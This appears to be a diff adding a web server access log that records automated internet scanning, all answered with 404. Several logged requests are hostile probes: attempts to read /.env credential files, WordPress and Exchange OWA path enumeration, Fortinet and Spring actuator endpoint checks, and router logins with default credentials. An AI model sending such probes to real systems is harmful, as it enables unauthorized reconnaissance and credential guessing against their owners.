+INFO:     127.0.0.1:36776 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36778 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36780 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     63.135.161.193:0 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     63.135.161.201:0 - "POST / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36788 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36790 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36792 - "GET / HTTP/1.0" 404 Not Found
+INFO:     46.3.199.111:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36796 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.86.26:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     170.231.32.212:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     161.35.215.241:0 - "GET /api/index.php/v1/config/application?public=true HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     127.0.0.1:36842 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36844 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36846 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     176.53.218.236:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.90.63.10:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     183.136.225.5:29247 - "GET / HTTP/1.1" 404 Not Found
+INFO:     183.136.225.5:56943 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36852 - "GET /actuator/gateway/routes HTTP/1.0" 404 Not Found
+INFO:     64.62.197.150:11839 - "GET / HTTP/1.1" 404 Not Found
+INFO:     64.62.197.151:14861 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
+INFO:     64.62.197.145:24519 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     15.204.194.30:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     135.148.195.4:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     51.254.59.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     104.156.149.37:0 - "HEAD / HTTP/1.0" 404 Not Found
+INFO:     35.227.146.74:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36866 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36868 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36870 - "GET /owa/auth/logon.aspx HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36872 - "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36874 - "GET /owa/auth/x.js HTTP/1.0" 404 Not Found
+INFO:     104.199.31.214:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     194.26.192.98:0 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     64.227.170.182:0 - "GET /auth.asp HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36922 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36924 - "GET /actuator/health HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36926 - "GET /remote/fgt_lang HTTP/1.0" 404 Not Found
+INFO:     103.203.57.20:59742 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36928 - "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.0" 404 Not Found
+INFO:     195.13.190.224:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36932 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36934 - "GET / HTTP/1.0" 404 Not Found
+INFO:     35.90.159.11:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     172.104.242.173:0 - "GET /0bef HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36940 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36942 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     184.105.247.196:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     184.105.247.196:0 - "GET /geoserver/web/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36950 - "GET /ReportServer HTTP/1.0" 404 Not Found
+INFO:     135.148.195.16:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     135.148.195.4:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     117.194.148.187:0 - "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 Not Found
+INFO:     14.29.182.82:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36960 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36962 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36964 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36966 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36968 - "GET /explore HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.225.74.42:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36974 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36976 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36978 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36980 - "GET /.well-known/security.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36982 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36984 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36986 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     193.142.146.214:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     94.102.61.10:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36992 - "GET / HTTP/1.0" 404 Not Found
+INFO:     179.43.177.242:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     107.170.192.6:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     34.244.45.176:0 - "HEAD / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37002 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:37004 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     45.90.61.47:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.90.62.183:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     45.81.243.34:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.209.160.120:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     167.94.138.124:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     167.94.138.124:0 - "GET / HTTP/1.0" 404 Not Found
